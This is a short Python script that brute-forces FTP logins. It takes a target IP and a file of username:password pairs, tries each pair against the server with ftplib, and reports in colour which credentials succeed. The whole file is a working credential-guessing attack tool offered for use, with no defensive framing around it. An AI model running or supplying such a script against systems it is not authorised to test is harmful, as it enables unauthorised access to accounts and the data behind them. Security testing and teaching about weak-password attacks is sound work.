import ftplib
from termcolor import colored

def brutelogin(hostname, passwordfile):
	try:
		pf = open(passwordfile, "r")
	except:
		print("[!] File does not exist")

	for line in pf.readlines():
		username = line.split(":")[0]
		password = line.split(":")[1].strip("\n")
		print("[+] Trying: " + username + "/" + password)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(username, password)
			print(colored("[+] Login Suceeded with: " + username + "/" + password, "green"))
			break
			ftp.quit()
		except:
			print(colored("[-] Login failed", "red"))	
			
		
host = input("Enter host IP address: ")
passwordfile = input("Input password file path: ")
brutelogin(host, passwordfile)
